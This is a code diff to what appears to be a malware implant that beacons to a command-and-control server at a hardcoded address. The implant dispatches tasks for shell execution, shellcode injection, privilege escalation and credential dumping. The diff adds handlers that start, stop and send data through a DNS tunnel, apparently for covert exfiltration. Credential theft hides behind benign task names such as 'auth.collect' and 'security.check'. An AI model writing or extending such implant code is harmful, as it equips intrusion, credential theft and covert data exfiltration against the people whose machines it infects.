@@ -22,6 +22,7 @@ from modules.shell import execute_command
 from modules.files import list_directory, read_file
 from modules.shellcode import inject_shellcode
 from modules.dns_tunnel import start_dns_tunnel
+from modules.dns_tunnel_manager import start_dns_tunnel_cmd, stop_dns_tunnel_cmd, get_dns_tunnel_status, send_data_through_tunnel
 from modules.privesc import attempt_privilege_escalation
 from modules.credential_dump import dump_credentials
 from modules.credential_decryptor import decrypt_credentials_auto
@@ -66,7 +67,7 @@ try:
     ENCRYPTION_KEY = KEY_B64.encode()
 except ImportError:
     # Fallback configuration if config.py is not available
-    C2_URL = "http://192.168.200.105:5000"
+    C2_URL = "http://10.2.0.2:5000"
     BEACON_INTERVAL = 10
     NETWORK_TIMEOUT = 10
     _KEY_B64 = ''.join(['dGhpcyBpcyBhIHNlY3JldCBrZXkgZm9yIGVuY3J5cHRpb24='])
@@ -393,6 +394,10 @@ def run_task(task):
             'shellcode_inject': lambda: inject_shellcode(task_data.get('process'), task_data.get('shellcode')) if task_data.get('process') and task_data.get('shellcode') else "Missing process or shellcode",
             'network.tunnel': lambda: start_dns_tunnel(task_data.get('domain')) if task_data.get('domain') else "Missing domain",
             'network_tunnel': lambda: start_dns_tunnel(task_data.get('domain')) if task_data.get('domain') else "Missing domain",
+            'dns_tunnel_start': lambda: start_dns_tunnel_cmd(task_data.get('domain')) if task_data.get('domain') else "Missing domain",
+            'dns_tunnel_stop': lambda: stop_dns_tunnel_cmd(),
+            'dns_tunnel_status': lambda: get_dns_tunnel_status(),
+            'dns_tunnel_send': lambda: send_data_through_tunnel(task_data.get('data')) if task_data.get('data') else "Missing data to send",
             'security.check': attempt_privilege_escalation,
             'security_check': attempt_privilege_escalation,
             'auth.collect': lambda: dump_credentials(task_id),
